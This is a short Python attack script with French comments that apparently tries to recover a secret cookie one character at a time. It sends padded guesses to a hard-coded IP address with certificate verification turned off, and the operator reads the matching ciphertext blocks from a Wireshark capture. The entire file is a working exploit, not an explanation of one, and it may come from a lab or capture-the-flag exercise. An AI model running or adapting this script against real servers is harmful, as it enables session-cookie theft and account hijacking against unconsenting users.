import requests
import string
import time
import urllib3
urllib3.disable_warnings()

URL = "https://37.187.103.134:8443/"

# Alphabet à tester
ALPHABET = string.ascii_letters + string.digits + "=._-"

# Longueur approximative du cookie 
COOKIE_LEN = 16

# Pause pour laisser Wireshark capturer proprement
PAUSE = 0.5

def send_guess(pad, guess):
    query = pad + guess
    full_url = URL + "?pad=" + query
    print(f"[>] Sending: {query}")
    r = requests.get(full_url, verify=False)
    time.sleep(PAUSE)

def main():
    known = ""
    for i in range(COOKIE_LEN):
        pad_len = COOKIE_LEN - i - 1
        pad = "A" * pad_len
        for c in ALPHABET:
            send_guess(pad, known + c)
        char = input("[?] Quel caractère correspond au bloc ? ")
        known += char
        print(f"[+] Cookie partiel : {known}")

if __name__ == "__main__":
    main()